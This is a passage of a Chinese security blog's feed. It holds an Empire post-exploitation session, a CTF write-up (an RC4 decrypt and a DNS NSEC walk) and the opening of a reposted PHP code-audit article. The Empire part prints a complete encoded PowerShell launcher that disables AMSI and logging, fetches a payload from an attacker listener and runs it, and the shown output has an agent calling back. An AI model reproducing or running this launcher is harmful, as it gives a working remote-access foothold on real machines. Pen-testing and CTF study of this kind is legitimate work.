class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#端口映射参考上条</span></span><br><span class="line">================================================================</span><br><span class="line"> [Empire]  Post-Exploitation Framework</span><br><span class="line">================================================================</span><br><span class="line"> [Version] 2.3 | [Web] https://github.com/empireProject/Empire</span><br><span class="line">================================================================</span><br><span class="line"></span><br><span class="line">   _______ .___  ___. .______    __  .______       _______</span><br><span class="line">  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|</span><br><span class="line">  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__</span><br><span class="line">  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|</span><br><span class="line">  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____</span><br><span class="line">  |_______||__|  |__| | _|      |__| | _| `._____||_______|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       282 modules currently loaded</span><br><span class="line"></span><br><span class="line">       0 listeners currently active</span><br><span class="line"></span><br><span class="line">       0 agents currently active</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire) &gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Commands</span><br><span class="line">========</span><br><span class="line">agents            Jump to the Agents menu.</span><br><span class="line">creds             Add/display credentials to/from the database.</span><br><span class="line"><span class="built_in">exit</span>              Exit Empire</span><br><span class="line"><span class="built_in">help</span>              Displays the <span class="built_in">help</span> menu.</span><br><span class="line">interact          Interact with a particular agent.</span><br><span class="line">list              Lists active agents or listeners.</span><br><span class="line">listeners         Interact with active listeners.</span><br><span class="line">load              Loads Empire modules from a non-standard folder.</span><br><span class="line">preobfuscate      Preobfuscate PowerShell module_source files</span><br><span class="line">reload            Reload one (or all) Empire modules.</span><br><span class="line">reset             Reset a global option (e.g. IP whitelists).</span><br><span class="line">resource          Read and execute a list of Empire commands from a file.</span><br><span class="line">searchmodule      Search Empire module names/descriptions.</span><br><span class="line"><span class="built_in">set</span>               Set a global option (e.g. IP whitelists).</span><br><span class="line">show              Show a global option (e.g. IP whitelists).</span><br><span class="line">usemodule         Use an Empire module.</span><br><span class="line">usestager         Use an Empire stager.</span><br><span class="line"></span><br><span class="line">(Empire) &gt; list</span><br><span class="line">(Empire) &gt; listeners</span><br><span class="line">[!] No listeners currently active</span><br><span class="line">(Empire: listeners) &gt; uselistener http</span><br><span class="line">(Empire: listeners/http) &gt; info</span><br><span class="line"></span><br><span class="line">    Name: HTTP[S]</span><br><span class="line">Category: client_server</span><br><span class="line"></span><br><span class="line">Authors:</span><br><span class="line">  @harmj0y</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Starts a http[s] listener (PowerShell or Python) that uses a</span><br><span class="line">  GET/POST approach.</span><br><span class="line"></span><br><span class="line">HTTP[S] Options:</span><br><span class="line"></span><br><span class="line">  Name              Required    Value                            Description</span><br><span class="line">  ----              --------    -------                          -----------</span><br><span class="line">  SlackToken        False                                        Your SlackBot API token to communicate with your Slack instance.</span><br><span class="line">  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use <span class="keyword">for</span> request (default, none, or other).</span><br><span class="line">  KillDate          False                                        Date <span class="keyword">for</span> the listener to <span class="built_in">exit</span> (MM/dd/yyyy).</span><br><span class="line">  Name              True        http                             Name <span class="keyword">for</span> the listener.</span><br><span class="line">  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.</span><br><span class="line">  DefaultDelay      True        5                                Agent delay/reach back interval (<span class="keyword">in</span> seconds).</span><br><span class="line">  DefaultLostLimit  True        60                               Number of missed checkins before exiting</span><br><span class="line">  WorkingHours      False                                        Hours <span class="keyword">for</span> the agent to operate (09:00-17:00).</span><br><span class="line">  SlackChannel      False       <span class="comment">#general                         The Slack channel or DM that notifications will be sent to.</span></span><br><span class="line">  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile <span class="keyword">for</span> the agent.</span><br><span class="line">                                process.php|Mozilla/5.0 (Windows</span><br><span class="line">                                NT 6.1; WOW64; Trident/7.0;</span><br><span class="line">                                rv:11.0) like Gecko</span><br><span class="line">  Host              True        http://172.17.0.2:80             Hostname/IP <span class="keyword">for</span> staging.</span><br><span class="line">  CertPath          False                                        Certificate path <span class="keyword">for</span> https listeners.</span><br><span class="line">  DefaultJitter     True        0.0                              Jitter <span class="keyword">in</span> agent reachback interval (0.0-1.0).</span><br><span class="line">  Proxy             False       default                          Proxy to use <span class="keyword">for</span> request (default, none, or other).</span><br><span class="line">  UserAgent         False       default                          User-agent string to use <span class="keyword">for</span> the staging request (default, none, or other).</span><br><span class="line">  StagingKey        True        3ab47284cf7e260541d810beb54d3405 Staging key <span class="keyword">for</span> initial agent negotiation.</span><br><span class="line">  BindIP            True        0.0.0.0                          The IP to <span class="built_in">bind</span> to on the control server.</span><br><span class="line">  Port              True        80                               Port <span class="keyword">for</span> the listener.</span><br><span class="line">  ServerVersion     True        Microsoft-IIS/7.5                Server header <span class="keyword">for</span> the control server.</span><br><span class="line">  StagerURI         False                                        URI <span class="keyword">for</span> the stager. Must use /download/. Example: /download/stager.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Name docker</span><br><span class="line"><span class="comment">#此处的172.16.188.1为vps的ip地址</span></span><br><span class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Host http://172.16.188.1:5000</span><br><span class="line">(Empire: listeners/http) &gt; execute</span><br><span class="line">[*] Starting listener <span class="string">'docker'</span></span><br><span class="line">[+] Listener successfully started!</span><br><span class="line">(Empire: listeners/http) &gt; lsit</span><br><span class="line">*** Unknown syntax: lsit</span><br><span class="line">(Empire: listeners/http) &gt; back</span><br><span class="line">(Empire: listeners) &gt; list</span><br><span class="line"></span><br><span class="line">[*] Active listeners:</span><br><span class="line"></span><br><span class="line">  Name              Module          Host                                 Delay/Jitter   KillDate</span><br><span class="line">  ----              ------          ----                                 ------------   --------</span><br><span class="line">  docker            http            http://172.16.188.1:5000             5/0.0</span><br><span class="line"></span><br><span class="line">(Empire: listeners) &gt; usestager</span><br><span class="line">multi/bash                osx/dylib                 osx/teensy                windows/launcher_sct</span><br><span class="line">multi/launcher            osx/jar                   windows/bunny             windows/launcher_vbs</span><br><span class="line">multi/pyinstaller         osx/launcher              windows/dll               windows/macro</span><br><span class="line">multi/war                 osx/macho                 windows/ducky             windows/macroless_msword</span><br><span class="line">osx/applescript           osx/macro                 windows/hta               windows/teensy</span><br><span class="line">osx/application           osx/pkg                   windows/launcher_bat</span><br><span class="line">osx/ducky                 osx/safari_launcher       windows/launcher_lnk</span><br><span class="line">(Empire: listeners) &gt; usestager windows/d</span><br><span class="line">dll    ducky</span><br><span class="line">(Empire: listeners) &gt; usestager windows/dll</span><br><span class="line">(Empire: stager/windows/dll) &gt; info</span><br><span class="line"></span><br><span class="line">Name: DLL Launcher</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Generate a PowerPick Reflective DLL to inject with</span><br><span class="line">  stager code.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"></span><br><span class="line">  Name             Required    Value             Description</span><br><span class="line">  ----             --------    -------           -----------</span><br><span class="line">  Listener         True                          Listener to use.</span><br><span class="line">  ProxyCreds       False       default           Proxy credentials</span><br><span class="line">                                                 ([domain\]username:password) to use <span class="keyword">for</span></span><br><span class="line">                                                 request (default, none, or other).</span><br><span class="line">  Obfuscate        False       False             Switch. Obfuscate the launcher</span><br><span class="line">                                                 powershell code, uses the</span><br><span class="line">                                                 ObfuscateCommand <span class="keyword">for</span> obfuscation types.</span><br><span class="line">                                                 For powershell only.</span><br><span class="line">  Proxy            False       default           Proxy to use <span class="keyword">for</span> request (default, none,</span><br><span class="line">                                                 or other).</span><br><span class="line">  Language         True        powershell        Language of the stager to generate.</span><br><span class="line">  OutFile          True        /tmp/launcher.dll File to output dll to.</span><br><span class="line">  UserAgent        False       default           User-agent string to use <span class="keyword">for</span> the staging</span><br><span class="line">                                                 request (default, none, or other).</span><br><span class="line">  Arch             True        x64               Architecture of the .dll to generate</span><br><span class="line">                                                 (x64 or x86).</span><br><span class="line">  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation <span class="built_in">command</span> to use.</span><br><span class="line">                                                 Only used <span class="keyword">if</span> Obfuscate switch is True.</span><br><span class="line">                                                 For powershell only.</span><br><span class="line">  StagerRetries    False       0                 Times <span class="keyword">for</span> the stager to retry</span><br><span class="line">                                                 connecting.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(Empire: stager/windows/dll) &gt; <span class="built_in">set</span> Listener docker</span><br><span class="line">(Empire: stager/windows/dll) &gt; back</span><br><span class="line">(Empire: listeners) &gt; launcher powershell docker</span><br><span class="line">powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAcwBpAE8AbgBUAEEAYgBMAEUALgBQAFMAVgBFAHIAcwBJAE8ATgAuAE0AQQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAAUwA9AFsAUgBFAGYAXQAuAEEAcwBzAEUATQBCAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBFAFQAVgBBAGwAdQBlACgAJABOAFUAbABsACkAOwBJAGYAKAAkAEcAUABTAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAA7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0ARQBMAHMAZQB7AFsAUwBDAHIAaQBQAFQAQgBsAG8AYwBrAF0ALgAiAEcARQBUAEYASQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbAB1AEUAKAAkAG4AVQBsAGwALAAoAE4AZQBXAC0ATwBCAGoAZQBDAFQAIABDAG8ATABsAEUAYwBUAGkAbwBOAHMALgBHAEUATgBlAFIAaQBDAC4ASABBAHMASABTAEUAVABbAFMAdAByAEkAbgBHAF0AKQApAH0AWwBSAEUAZgBdAC4AQQBzAFMARQBtAEIATAB5AC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQAbgB1AGwAbAAsACQAVABSAHUAZQApAH0AOwB9ADsAWwBTAFkAcwB0AEUAbQAuAE4ARQB0AC4AUwBFAFIAdgBpAEMAZQBQAG8ASQBOAFQATQBBAG4AYQBnAEUAcgBdADoAOgBFAFgAcABlAEMAVAAxADAAMABDAE8AbgB0AGkAbgBVAEUAPQAwADsAJAB3AEMAPQBOAGUAVwAtAE8AQgBqAGUAQwB0ACAAUwB5AFMAVABlAE0ALgBOAGUAVAAuAFcARQBiAEMATABJAEUAbgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAdwBDAC4ASABFAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAE8AWABZAD0AWwBTAFkAUwB0AGUAbQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAVQBlAFMAVABdADoAOgBEAEUAZgBBAHUAbABUAFcAZQBCAFAAcgBPAFgAeQA7ACQAdwBDAC4AUABSAG8AWABZAC4AQwByAGUAZABFAG4AdABpAGEATABzACAAPQAgAFsAUwBZAFMAdABlAE0ALgBOAGUAVAAuAEMAcgBlAGQAZQBuAFQASQBhAGwAQwBhAGMASABlAF0AOgA6AEQAZQBGAGEAVQBMAFQATgBFAFQAVwBvAHIASwBDAHIAZQBEAEUATgB0AEkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUATQAuAFQAZQB4AFQALgBFAE4AQwBPAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgBZAFQAZQBTACgAJwAzAGEAYgA0ADcAMgA4ADQAYwBmADcAZQAyADYAMAA1ADQAMQBkADgAMQAwAGIAZQBiADUANABkADMANAAwADUAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEAOAA4AC4AMQA6ADUAMAAwADAAJwA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAVwBjAC4ASABFAEEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AUgAvAGoAMwAxAEkAYwBRAGQAZQAzAEYANwB2AGoAWABYADIAbgBwADYARQAyAFcAcQBiAGMAPQAiACkAOwAkAEQAYQBUAEEAPQAkAFcAQwAuAEQAbwBXAE4AbABvAEEARABEAGEAVABBACgAJABzAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQB0AGEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAGUATgBHAHQASABdADsALQBKAE8AaQBuAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==</span><br><span class="line"><span class="comment">#在目标机器上执行上面的payload就可以得到下面的反弹</span></span><br><span class="line">(Empire: listeners) &gt; [+] Initial agent G3BYNCLW from 172.17.0.1 now active (Slack)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h3&gt;&lt;p&gt;Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。&lt;/p&gt;
&lt;p&gt;Docker容器：一个轻量级沙箱，来
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>EIS 2017 DNS101题解</title>
    <link href="http://zer0yu.github.io/2017/11/02/EIS-2017-MISC%E9%A2%98%E8%A7%A3/"/>
    <id>http://zer0yu.github.io/2017/11/02/EIS-2017-MISC题解/</id>
    <published>2017-11-02T13:26:11.000Z</published>
    <updated>2017-11-02T13:35:12.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天跟大佬们在做EIS 2017运维挑战赛，我看的时候大佬们已经把web做的差不多了。所以我就来解决两道MISC。</p><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>第一个是rc4的一个解密，挺简单的，手撸一个解密代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#密文：下面十六进制的一串；密钥：hello world</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4</span><span class="params">(data,key)</span>:</span></span><br><span class="line">  j=<span class="number">0</span></span><br><span class="line">  s=range(<span class="number">256</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    j=(j+s[i]+ord(key[i%len(key)]))%<span class="number">256</span></span><br><span class="line">    s[i],s[j]=s[j],s[i]</span><br><span class="line">  i=<span class="number">0</span></span><br><span class="line">  j=<span class="number">0</span></span><br><span class="line">  out=[]</span><br><span class="line">  <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+s[i])%<span class="number">256</span></span><br><span class="line">    s[i],s[j]=s[j],s[i]</span><br><span class="line">    out.append(chr(ord(char)^s[(s[i]+s[j])%<span class="number">256</span>]))</span><br><span class="line">  <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line">encodedata=rc4(<span class="string">'\xCA\xEE\x86\x30\x48\xC4\xEC\x56\x3D\x22\x2A\xBC\x9A\x95\x70\x23\x39\x76\x3B\xEE\x09\x29\x2B\x01\x54\x00\x87\x5E\x37\x23\x3E\x79\x8B\x7B\xA9\x20\x78'</span>,<span class="string">'hello world'</span>)</span><br><span class="line"><span class="keyword">print</span> encodedata</span><br></pre></td></tr></table></figure><h3 id="DNS-101"><a href="#DNS-101" class="headerlink" title="DNS 101"></a>DNS 101</h3><p>这个题我是懵逼了一上午，dig了一早上TXT没想到玄机在与NSEC(DNSSEC 的一部分 — 用来验证一个未存在的服务器，使用与 NXT（已过时）记录的格式)。还有一点就是dig any的用法，这个当时也是没有考虑到。（多谢rebirth的指点）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">target = <span class="string">'what.is.my.flag.src.edu-info.edu.cn'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  output = subprocess.Popen([<span class="string">'dig any'</span>+<span class="string">' '</span>+target],stdout=subprocess.PIPE,shell=<span class="literal">True</span>).communicate()</span><br><span class="line"></span><br><span class="line">  <span class="comment">#print output[0]</span></span><br><span class="line"></span><br><span class="line">  result = re.findall(<span class="string">".*NSEC(.*). TXT.*"</span>,output[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span> result[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">  target = result[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">  flag = subprocess.Popen([<span class="string">'dig'</span>+<span class="string">' '</span>+target+<span class="string">' '</span>+<span class="string">'TXT'</span>],stdout=subprocess.PIPE,shell=<span class="literal">True</span>).communicate()</span><br><span class="line">  <span class="comment">#EIS&#123;&#125;是flag的格式</span></span><br><span class="line">  <span class="keyword">if</span> <span class="string">'EIS'</span> <span class="keyword">in</span> flag[<span class="number">0</span>]:</span><br><span class="line">    <span class="keyword">print</span> flag[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最终结果：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-02%20%E4%B8%8B%E5%8D%889.23.28.png" alt="屏幕快照 2017-11-02 下午9.23.28"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;今天跟大佬们在做EIS 2017运维挑战赛，我看的时候大佬们已经把web做的差不多了。所以我就来解决两道MISC。&lt;/p&gt;
&lt;h3 id=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>[转载]高级PHP应用程序漏洞审核技术</title>
    <link href="http://zer0yu.github.io/2017/10/31/%E8%BD%AC%E8%BD%BD-%E9%AB%98%E7%BA%A7PHP%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%AE%A1%E6%A0%B8%E6%8A%80%E6%9C%AF/"/>
    <id>http://zer0yu.github.io/2017/10/31/转载-高级PHP应用程序漏洞审核技术/</id>
    <published>2017-10-31T11:08:46.000Z</published>
    <updated>2017-12-02T11:50:44.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。</p><p>随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。</p><p>也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。</p><p>另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：）</p><h3 id="传统的代码审计技术"><a href="#传统的代码审计技术" class="headerlink" title="传统的代码审计技术"></a>传统的代码审计技术</h3><p>WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输入”理解为只是gpc<code>[</code>$<code>_</code>GET,$<code>_</code>POST,$<code>_</code>COOKIE<code>]</code>，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。</p><p>PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。</p><p>其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用程序代码的审核，但是这些也依靠了我们上面提到的字典。</p><h3 id="PHP版本与应用代码审计"><a href="#PHP版本与应用代码审计" class="headerlink" title="PHP版本与应用代码审计"></a>PHP版本与应用代码审计</h3><p>到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下：</p><table><thead><tr><th style="text-align:left">版本</th><th style="text-align:left">占比</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">php4</td><td style="text-align:left">68%</td><td style="text-align:left">2000-2007，No security fixes after 2008/08，最终版本是php4.4.9</td></tr><tr><td style="text-align:left">php5</td><td style="text-align:left">32%</td><td style="text-align:left">2004-present，Now at version 5.2.6（PHP 5.3 alpha1 released!）</td></tr><tr><td style="text-align:left">php6</td><td style="text-align:left"></td><td style="text-align:left">目前还在测试阶段，变化很多做了大量的修改，取消了很多安全选项如magic_quotes_gpc</td></tr></tbody></table><p>由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。</p><h3 id="其他的因素与应用代码审计"><a href="#其他的因素与应用代码审计" class="headerlink" title="其他的因素与应用代码审计"></a>其他的因素与应用代码审计</h3><p>很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营win/<code>*</code>nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同的WEB SERVER有着不同的安全特点或特性，下文有些部分会涉及。</p><p>所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，PHP版本等信息。</p><h3 id="扩展我们的字典"><a href="#扩展我们的字典" class="headerlink" title="扩展我们的字典"></a>扩展我们的字典</h3><p>下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。</p><h3 id="变量本身的key"><a href="#变量本身的key" class="headerlink" title="变量本身的key"></a>变量本身的key</h3><hr><p>说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></span><br><span class="line"><span class="comment">//print_R($_GET); </span></span><br><span class="line"> <span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> $key.<span 